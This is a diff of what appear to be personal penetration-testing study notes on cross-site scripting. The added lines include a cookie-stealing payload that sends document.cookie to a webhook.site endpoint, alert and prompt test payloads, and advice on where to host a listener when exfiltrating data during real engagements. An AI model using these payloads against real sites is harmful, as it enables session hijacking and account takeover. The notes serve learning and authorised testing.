@@ -85,6 +85,16 @@ alert(1)
 is the most famous cross site scripting payload that you will come across.
 Avoid using alter(1) cuz of the changes in Chrome and also how often it's filtered and detected.
 
+
+Can use Netcat to listen locally or can use webhook.site
+https://webhook.site/#!/2ba09e5e-3bbb-4103-8924-2cee42b01330
+
+
+>[!warning]
+In the real world when working as a pentest and exfilterating sensitive information, don't use public sites like webhook but can use EC2 instance or if vpn-ed into the network you can just use your local machine and listen.
+
+
+
 >[! bug] Mentor recommend when u're testing for XSS either use print or prompt
 
 ### Reflected
@@ -118,6 +128,10 @@ Something that you might want to consider is that when testing for cross site sc
 <script>alert(document.cookie)</script>
 ```
 
+```
+<script>prompt(document.cookie)</script>
+```
+
 
 
 >[! warning]
@@ -148,6 +162,12 @@ Command : window.location.href
 ```
 <img src=x onerror="window.location.href ='' ">
 ```
+
+
+```
+<script>var i = new Image; i.src="https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3/?"+document.cookie;</script>
+```
+
 
 
 
